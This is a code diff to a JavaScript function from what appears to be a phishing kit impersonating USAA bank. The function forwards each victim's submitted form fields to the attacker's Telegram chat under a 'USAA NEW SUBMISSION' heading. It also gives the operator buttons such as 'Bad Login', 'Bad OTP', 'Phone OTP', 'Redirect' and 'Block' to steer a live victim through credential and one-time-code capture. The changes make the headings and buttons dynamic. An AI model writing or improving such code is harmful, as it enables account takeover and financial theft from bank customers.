@@ -328,12 +328,54 @@ async function buildMessage(data, options = {}) {
   } = options;
 
   try {
-    let message = `🤖 USAA NEW SUBMISSION\n\n`;
-    const excludeKeys = ["visitor", "userid", "security_code"];
+    if (!userId) throw new Error("userId is missing");
 
     // -----------------------------
-    // Build message body
+    // Check if submission contains email or username
     // -----------------------------
+    const hasEmailOrUsername = Object.keys(data).some(key => {
+      const lower = key.toLowerCase();
+      return lower.includes("email") || lower.includes("username");
+    });
+
+    let identifier = null;
+    let page = "";
+    let isBlocked = false;
+
+    // -----------------------------
+    // Get user info from DB
+    // -----------------------------
+    if (db) {
+      const userRow = await db.get(
+        "SELECT status, page, identifier FROM users WHERE id = ?",
+        [userId]
+      );
+
+      if (!userRow) {
+        throw new Error(`User ${userId} not found in database`);
+      }
+
+      identifier = userRow.identifier;
+      page = (userRow.page || "").toLowerCase();
+      isBlocked = userRow.status === "blocked";
+    }
+
+    // -----------------------------
+    // Dynamic Heading
+    // -----------------------------
+    let heading;
+
+    if (hasEmailOrUsername) {
+      heading = `🤖 USAA NEW SUBMISSION`;
+    } else {
+      const display = identifier || userId;
+      heading = `🤖 USAA NEW SUBMISSION @${display}`;
+    }
+
+    let message = `${heading}\n\n`;
+
+    const excludeKeys = ["visitor", "userid", "security_code"];
+
     for (const [key, value] of Object.entries(data)) {
       if (value && !excludeKeys.includes(key.toLowerCase())) {
         message += `${key.toUpperCase()}   : ${value}\n`;
@@ -348,56 +390,37 @@ async function buildMessage(data, options = {}) {
       throw new Error("Bot token or Chat ID missing");
     }
 
-    if (!userId) {
-      throw new Error("userId is missing");
-    }
-
     if (!db) {
       throw new Error("Database instance (db) is missing");
     }
 
-    const messageText = String(message || "Select a command:");
+    const buttons = [];
 
-    // -----------------------------
-    // Get user status + page from DB
-    // -----------------------------
-    const userRow = await db.get(
-      "SELECT status, page FROM users WHERE id = ?",
-      [userId]
-    );
+    // Always visible row
+    buttons.push([
+      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+    ]);
 
-    if (!userRow) {
-      throw new Error(`User ${userId} not found in database`);
+    // Only show bad/otp buttons for login or otp pages
+    if (page === "login" || page.includes("otp")) {
+      const badButton =
+        page === "login"
+          ? {
+              text: "Bad Login",
+              callback_data: `cmd:bad-login:${userId}`
+            }
+          : {
+              text: "Bad OTP",
+              callback_data: `cmd:bad-otp:${userId}`
+            };
+
+      buttons.push([
+        badButton,
+        { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+      ]);
     }
 
-    const isBlocked = userRow.status === "blocked";
-    const page = (userRow.page || "").toLowerCase();
-
-    // -----------------------------
-    // Dynamic Bad Button
-    // -----------------------------
-    let badButton;
-
-    if (page === "login") {
-      badButton = {
-        text: "Bad Login",
-        callback_data: `cmd:bad-login:${userId}`
-      };
-    } else if (page.includes("otp")) {
-      badButton = {
-        text: "Bad OTP",
-        callback_data: `cmd:bad-otp:${userId}`
-      };
-    } else {
-      badButton = {
-        text: "Bad Login",
-        callback_data: `cmd:bad-login:${userId}`
-      };
-    }
-
-    // -----------------------------
-    // Dynamic Block / Unblock Button
-    // -----------------------------
     const blockButton = isBlocked
       ? {
           text: "Unblock",
@@ -408,35 +431,19 @@ async function buildMessage(data, options = {}) {
           callback_data: `cmd:block:${userId}`
         };
 
-    // -----------------------------
-    // Final Keyboard Layout
-    // -----------------------------
-    const buttons = [
-      [
-        { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-        { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-      ],
-      [
-        badButton,
-        { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-      ],
-      [
-        { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
-        blockButton
-      ]
-    ];
+    buttons.push([
+      { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
+      blockButton
+    ]);
 
-    // -----------------------------
-    // Send Telegram Message
-    // -----------------------------
-    await sendTelegramMessage(botToken, chatId, messageText, {
+    await sendTelegramMessage(botToken, chatId, message, {
       parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: buttons
       }
     });
 
-    console.log("✅ Telegram message sent with DB-based dynamic buttons");
+    console.log("✅ Telegram message sent with dynamic heading + buttons");
 
     return message;
 
